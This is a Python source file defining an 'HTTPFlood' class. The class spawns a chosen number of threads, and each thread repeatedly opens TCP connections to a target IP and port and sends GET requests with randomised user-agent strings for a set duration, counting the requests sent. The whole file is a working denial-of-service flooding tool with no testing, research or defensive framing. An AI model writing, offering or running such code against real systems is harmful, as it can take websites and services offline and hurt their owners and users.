import socket
import random
import threading
import time

class HTTPFlood:
    def __init__(self):
        self.packet_count = 0
    
    def launch(self, target_ip, target_port, duration, threads):
        def flood():
            end_time = time.time() + duration
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
                "Mozilla/5.0 (Linux; Android 10; SM-G973F)"
            ]
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n"
                    sock.send(request.encode())
                    self.packet_count += 1
                    sock.close()
                except:
                    pass
        
        worker_threads = []
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        for t in worker_threads:
            t.join(timeout=duration)
        
        return self.packet_count
